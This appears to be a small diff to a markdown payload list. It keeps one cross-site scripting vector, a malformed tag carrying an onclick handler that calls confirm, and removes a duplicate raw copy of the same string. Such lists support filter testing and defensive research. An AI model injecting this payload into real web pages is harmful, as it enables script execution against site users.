@@ -8,4 +8,3 @@
 
 **Payload:**<br/> `<d3"<"/onclick="1>[confirm``]"<">z `
 
-<d3"<"/onclick="1>[confirm``]"<">z
